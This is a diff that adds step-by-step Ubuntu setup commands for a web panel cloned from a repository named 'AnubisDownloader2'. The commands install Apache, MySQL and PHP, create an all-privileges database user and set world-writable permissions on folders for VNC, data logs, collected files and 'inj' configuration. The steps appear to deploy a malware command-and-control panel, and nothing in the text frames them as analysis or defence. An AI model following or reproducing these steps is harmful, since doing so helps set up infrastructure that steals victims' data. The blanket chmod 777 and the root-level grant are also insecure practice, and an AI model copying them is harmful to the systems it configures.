@@ -1,4 +1,57 @@
-none
+sudo -i (ROOT) UBUNTU
+apt update
+apt install git screen nano mv
+apt install zlib1g
+apt install zlib1g-dev
+apt -y install software-properties-common
+add-apt-repository ppa:ondrej/php
+apt install apache2 mysql-server php7.0 php7.0-mysql php7.0-json php7.0-cli php7.0-gd php7.0-mbstring php7.0-xml
+service apache2 restart
+cd /var/run
+service mysql restart
+chmod 777 mysqld
+mysql
+CREATE DATABASE `YW51YmlzZGI`;
+CREATE USER 'anubisroot'@'localhost' IDENTIFIED BY 'd2Vyd2Vxc2Q';
+GRANT ALL PRIVILEGES ON *.* TO 'anubisroot'@'localhost';
+FLUSH PRIVILEGES;
+cd /var/www
+rm -Rf html
+git clone https://github.com/CubRube/AnubisDownloader2
+mv AnubisDownloader2 html
+chmod 777 html
+cd html
+mv phpmyadmin /var/www/htmlphpmyadmin
+cd /
+chmod 777 htmlphpmyadmin
+cd /var/www/html
+mysql -u root -p YW51YmlzZGI < database.sql
+cd c2Zkc2RmYXNkYXNzZGE\application\
+chmod 777 websocket\*.*
+chmod 777 websocket\sound\*.*
+chmod 777 websocket\VNC\*.*
+chmod 777 *.*
+chmod 777 datalogs\*.*
+chmod 777 datalogs\files\*.*
+chmod 777 datalogs\logs\*.*
+chmod 777 datalogs\numers\*.*
+cd /var/www/html/c2Zkc2RmYXNkYXNzZGE/c2Zkc2RmYXNkYXNzZGE
+chmod 777 application
+cd application
+chmod 777 websocket\*.*
+chmod 777 websocket\sound\*.*
+chmod 777 websocket\VNC\*.*
+chmod 777 *.*
+chmod 777 datalogs\*.*
+chmod 777 datalogs\files\*.*
+chmod 777 datalogs\logs\*.*
+chmod 777 datalogs\numers\*.*
+cd /var/www/htmlphpmyadmin/
+screen php -S 127.0.0.1:8081 (phpmyadmin) no close crtl + C
+__________________________________
+nano /var/www/html/inj/config.php
+
+localhost/ -> yoururl(ip:port)/
 
 
 
